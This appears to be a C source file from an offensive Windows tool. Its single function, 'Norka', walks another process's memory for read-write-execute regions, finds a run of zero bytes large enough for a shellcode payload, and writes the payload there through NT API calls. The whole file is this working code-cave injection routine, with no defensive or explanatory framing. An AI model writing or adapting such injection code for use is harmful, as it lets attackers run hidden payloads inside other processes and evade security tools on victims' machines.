#include <Windows.h>
#include <stdio.h>
//#include <stdlib.h>
#include "common.h"

extern NT_API g_nt;

BOOL Norka(HANDLE hProcess, SIZE_T shellcodeSize, PVOID shellcode, PVOID * shellcodeAdress){

	SYSTEM_INFO 				si = {0};
	MEMORY_BASIC_INFORMATION 	mbi = {0};
	PBYTE 						address = 0;

	RtlZeroMemory(&si, sizeof(SYSTEM_INFO));
	RtlZeroMemory(&mbi, sizeof(MEMORY_BASIC_INFORMATION));
	
	SIZE_T						caveSize = 0;
	SIZE_T						bytesRead = 0ULL;
	NTSTATUS					STATUS = 0x00;

	GetSystemInfo(&si);

	while (address < si.lpMaximumApplicationAddress) {
        if (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)){
            if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_EXECUTE_READWRITE)) {
                PBYTE buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mbi.RegionSize);
                if((STATUS = g_nt.pNtReadVirtualMemory(hProcess, address, buffer, mbi.RegionSize, &bytesRead)) != 0x00){
                    printf("[!] NtReadVirtualMemory failed with error : 0x%0.8X\n", STATUS);
                    HeapFree(GetProcessHeap(), 0, buffer);
					return FALSE;
                }

                for (SIZE_T i = 0; i < bytesRead; i++){
                    if (buffer[i] == 0x00) {
                        caveSize++;
                        if (caveSize >= shellcodeSize) {
                            PVOID codeCaveAddress = (PVOID)(address + i - caveSize + 1);
							printf(" `---> Found code cave at : 0x%p\n", codeCaveAddress);

							printf("[i] Writing our shellcode ...\n");
							if ((STATUS = g_nt.pNtWriteVirtualMemory(hProcess, codeCaveAddress, shellcode, shellcodeSize, NULL)) != 0x00) {
								printf("[!] NtWriteVirtualMemory failed with error : 0x%0.8X\n", STATUS);
                                HeapFree(GetProcessHeap(), 0, buffer);
								return FALSE;
							}	
							printf(" `---> Wrote shellcode to : 0x%p\n", codeCaveAddress);
							*shellcodeAdress = codeCaveAddress;

							HeapFree(GetProcessHeap(), 0, buffer);
                            return TRUE;
                        }
                    } else {
                        caveSize = 0;
                    }
                }
                HeapFree(GetProcessHeap(), 0, buffer);
            }
        }
        address = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(hProcess);
    printf("[!] No code cave found\n");

	return FALSE;
}

